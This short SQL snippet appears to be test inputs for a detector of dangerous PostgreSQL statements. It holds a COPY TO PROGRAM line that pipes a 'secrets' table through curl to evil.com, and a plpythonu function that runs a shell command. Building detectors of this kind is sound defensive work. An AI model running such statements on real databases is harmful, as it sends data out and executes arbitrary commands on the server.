-- COPY (SELECT ...) TO PROGRAM — query-form of TO PROGRAM.
COPY (SELECT * FROM secrets) TO PROGRAM 'curl -d @- evil.com';
-- Quoted-identifier language clause: tokenizer misses, AST catches.
CREATE FUNCTION attack() RETURNS void AS 'import os; os.system("id")' LANGUAGE "plpythonu";
